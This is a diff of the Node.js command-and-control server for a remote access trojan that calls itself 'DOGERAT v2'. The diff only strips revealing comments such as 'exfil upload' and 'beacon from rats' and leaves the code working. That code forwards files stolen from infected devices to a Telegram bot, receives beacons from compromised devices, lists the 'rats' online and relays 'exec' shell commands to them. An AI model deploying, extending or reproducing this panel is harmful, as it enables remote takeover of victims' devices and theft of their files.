@@ -6,14 +6,12 @@ const log = m => console.log([${new Date().toISOString()}] ${m}); const enc = d 
 
 app.use(express.static('public')); app.use(express.json({limit:'50mb'})); app.get('/',(_,r)=>r.sendFile(path.join(__dirname,'public','index.html')));
 
-/* exfil upload */ app.post('/up', up.single('f'), (q,r)=>{ const {originalname, buffer} = q.file; bot.sendDocument(cfg.id, buffer, {caption:📁 ${originalname}}, {filename:originalname}); r.sendStatus(200); });
+app.post('/up', up.single('f'), (q,r)=>{ const {originalname, buffer} = q.file; bot.sendDocument(cfg.id, buffer, {caption:📁 ${originalname}}, {filename:originalname}); r.sendStatus(200); });
 
-/* beacon from rats */ app.post('/b', (q,r)=>{ const j = JSON.parse(dec(q.body.d)); j.t = Date.now(); io.to('master').emit('beacon', j); r.json({status:'ok', interval:cfg.X.interval}); });
+app.post('/b', (q,r)=>{ const j = JSON.parse(dec(q.body.d)); j.t = Date.now(); io.to('master').emit('beacon', j); r.json({status:'ok', interval:cfg.X.interval}); });
 
-/* master panel */ io.on('connection', s=>{ s.on('auth', p=>{ if(p!==cfg.token) return s.disconnect(); s.join('master'); }); s.on('cmd', j=> io.to(j.id).emit('order', {type:j.type, payload:j.payload}) ); });
+io.on('connection', s=>{ s.on('auth', p=>{ if(p!==cfg.token) return s.disconnect(); s.join('master'); }); s.on('cmd', j=> io.to(j.id).emit('order', {type:j.type, payload:j.payload}) ); });
 
-/* telegram */ bot.onText(//start/, m=> bot.sendMessage(m.chat.id, '👹 DOGERAT v2 ready', {parse_mode:'HTML'})); bot.on('message', m=>{ if(m.chat.id!=cfg.id) return; const txt = (m.text||'').toLowerCase(); if(txt==='devices'){ const arr = Array.from(io.sockets.sockets.values()) .filter(x=>x.id!=='master') .map((x,i)=>${i+1}. ${x.handshake.query.model||'unknown'}); bot.sendMessage(cfg.id, arr.length?arr.join('\n'):'No rats online'); } if(txt.startsWith('exec ')){ const [_,id,...rest] = txt.split(' '); io.to(id).emit('order', {type:'shell', payload:rest.join(' ')}); } });
+bot.onText(//start/, m=> bot.sendMessage(m.chat.id, '👹 DOGERAT v2 ready', {parse_mode:'HTML'})); bot.on('message', m=>{ if(m.chat.id!=cfg.id) return; const txt = (m.text||'').toLowerCase(); if(txt==='devices'){ const arr = Array.from(io.sockets.sockets.values()) .filter(x=>x.id!=='master') .map((x,i)=>${i+1}. ${x.handshake.query.model||'unknown'}); bot.sendMessage(cfg.id, arr.length?arr.join('\n'):'No rats online'); } if(txt.startsWith('exec ')){ const [_,id,...rest] = txt.split(' '); io.to(id).emit('order', {type:'shell', payload:rest.join(' ')}); } });
 
-/* keep-alive */ setInterval(()=>https.get(cfg.host), 300e3);
-
-srv.listen(process.env.PORT||3000, ()=>log('C2 listening'));
+setInterval(()=>https.get(cfg.host), 300e3); srv.listen(process.env.PORT||3000, ()=>log('C2 listening'));
